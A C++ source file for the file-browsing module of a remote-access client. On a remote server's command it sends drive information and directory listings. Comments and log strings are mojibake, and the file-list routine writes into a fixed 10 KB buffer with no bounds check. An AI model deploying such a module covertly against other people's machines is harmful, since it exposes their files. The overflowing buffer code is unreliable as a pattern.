#include "ClientFileManager.h"



CClientFileManager::CClientFileManager(CIOCPClient* ClientObject):CManager(ClientObject)
{
	printf("�ļ������캯��\r\n");

	m_FileModuleBase = LoadLibrary("File.dll");

	if (m_FileModuleBase == NULL)
	{

	}

	m_GetLocalHardDiskInfo = (LPFN_GETLOCALHARDDISKINFO)GetProcAddress(m_FileModuleBase, "GetLocalHardDiskInfo");
	m_GetLocalFileList = (LPFN_GETLOCALFILELIST)GetProcAddress(m_FileModuleBase, "GetLocalFileList");
	
	SendClientFileInfo();

}
void CClientFileManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case  CLIENT_FILE_MANAGER_REQUIRE:
	{
		SendClientFileInfo();
		break;
	}
	case  CLIENT_FILE_LIST_REQUIRE:
	{
		SendClientFileList((char*)(PBYTE)BufferData + 1);   //��һ���ֽ�����Ϣ �������·��
		
		break;
	}
	case 2:
	{
		
		break;
	}
	}
}
BOOL CClientFileManager::SendClientFileInfo()             
{
		
	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v1 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;
	vector<_HARD_DISK_INFORMATION_> HardDiskInfo;

	if (m_GetLocalHardDiskInfo == NULL)
	{
		return IsOk;
	}
	ItemCount = m_GetLocalHardDiskInfo(HardDiskInfo);
	if (ItemCount == 0)
	{
		return IsOk;
	}

	vector<_HARD_DISK_INFORMATION_>::iterator i;


	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;

	for (i = HardDiskInfo.begin(); i != HardDiskInfo.end(); i++)
	{


		v1 = 2 + 4 + 4+ 4 + 4 + 
			lstrlen(i->DisplayName) + lstrlen(i->FileSystem)+lstrlen(i->HardDiskType) + 3;
		// ������̫С�������·�����
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		//����������memcpy�����򻺳����������� ���ݽṹ�� 
		//����ID+������+0+����������+0  ����
		//��Ϊ�ַ���������0 ��β��
		memcpy(BufferData + Offset, (i->HardDiskName), 2);
		Offset += 2;
		memcpy(BufferData + Offset, i->DisplayName, lstrlen(i->DisplayName) + 1);
		Offset += lstrlen(i->DisplayName) + 1;
		
		memcpy(BufferData + Offset, &(i->HardDiskIcon), sizeof(DWORD));
		Offset += sizeof(DWORD);

		memcpy(BufferData + Offset, &(i->IsDirectory), sizeof(BOOL));
		Offset += sizeof(BOOL);

		memcpy(BufferData + Offset, i->FileSystem, lstrlen(i->FileSystem) + 1);
		Offset += lstrlen(i->FileSystem) + 1;

		memcpy(BufferData + Offset, i->HardDiskType, lstrlen(i->HardDiskType) + 1);
		Offset += lstrlen(i->HardDiskType) + 1;

		memcpy(BufferData + Offset, &(i->HardDiskAmountMB), sizeof(float));
		Offset += sizeof(float);

		memcpy(BufferData + Offset, &(i->HardDiskFreeSpaceMB), sizeof(float));
		Offset += sizeof(float);

	}
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}

	return IsOk;
}
int  CClientFileManager::SendClientFileList(char* DirectoryPathData)
{
	BOOL  IsOk = FALSE;

	DWORD v1 = 0;
	ULONG ItemCount = 0;
	
	
	vector<FILE_OBJECT_INFORMATION> FileObjectInfo;

	if (m_GetLocalFileList == NULL)
	{
		return IsOk;
	}
	ItemCount = m_GetLocalFileList(DirectoryPathData,FileObjectInfo);
	if (ItemCount == 0)
	{
		BYTE IsToken = CLIENT_FILE_LIST_REPLY;
		return m_ClientObject->OnServerSending((char*)&IsToken, 1);
	}
	vector<FILE_OBJECT_INFORMATION>::iterator i;

	char*   BufferData = NULL;
	ULONG   BufferLength = 1024 * 10; // �ȷ���10K�Ļ�����
	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return IsOk;
	}
	BufferData[0] = CLIENT_FILE_LIST_REPLY;

	int Offset = 1;
	for (i=FileObjectInfo.begin();i!=FileObjectInfo.end();i++)
	{
		
		*(BufferData + Offset) = i->IsDirectory;  
		Offset++;
	

		ULONG FileNameLength = strlen(i->FileName);
		memcpy(BufferData + Offset, i->FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;  //0 == '\0'
		Offset++;


		memcpy(BufferData + Offset, &(i->FileSizeHigh), sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &(i->FileSizeLow), sizeof(DWORD));
		Offset += 8;

		memcpy(BufferData + Offset, &(i->LastWriteTime), sizeof(FILETIME));
		Offset += 8;
	}

	ULONG v7 = m_ClientObject->OnServerSending(BufferData, Offset);
	LocalFree(BufferData);

	return v7;

}
CClientFileManager::~CClientFileManager()
{

	printf("�ļ�������������\r\n");

	if (m_FileModuleBase != NULL)
	{
		FreeLibrary(m_FileModuleBase);
		m_FileModuleBase = NULL;
	}

}

